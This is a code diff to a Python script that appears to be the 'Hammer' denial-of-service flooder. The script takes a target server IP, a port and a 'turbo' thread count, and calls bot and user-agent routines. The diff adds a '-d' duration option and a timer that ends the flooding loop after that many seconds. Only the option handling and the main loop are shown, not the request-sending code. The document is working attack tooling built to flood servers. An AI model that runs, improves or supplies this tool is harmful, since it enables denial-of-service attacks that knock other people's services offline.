@@ -82,7 +82,8 @@ def usage():
 	-h : help
 	-s : server ip
 	-p : port default 80
-	-t : turbo default 135 \033[0m''')
+	-t : turbo default 135 
+	-d : duration default 60\033[0m''')
 	sys.exit()
 
 
@@ -91,11 +92,13 @@ def get_parameters():
 	global port
 	global thr
 	global item
+	global duration
 	optp = OptionParser(add_help_option=False,epilog="Hammers")
 	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
 	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
 	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
 	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
+	optp.add_option("-d","--duration",type="int",dest="duration",help="default 60 -t 60s")
 	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
 	opts, args = optp.parse_args()
 	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
@@ -113,6 +116,10 @@ def get_parameters():
 		thr = 135
 	else:
 		thr = opts.turbo
+	if opts.duration is None:
+		duration = 60
+	else:
+		duration = opts.duration
 
 
 # reading headers
@@ -129,7 +136,7 @@ if __name__ == '__main__':
 	if len(sys.argv) < 2:
 		usage()
 	get_parameters()
-	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
+	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr)," duration: ",str(duration),"\033[0m")
 	print("\033[94mPlease wait...\033[0m")
 	user_agent()
 	my_bots()
@@ -153,11 +160,16 @@ if __name__ == '__main__':
 		#tasking
 		item = 0
 		while True:
+			end = time.time()
+			if end-start > duration:
+				break
 			if (item>1800): # for no memory crash
 				item=0
 				time.sleep(.1)
 			item = item + 1
 			q.put(item)
 			w.put(item)
+		if end-start > duration:
+			break
 		q.join()
 		w.join()
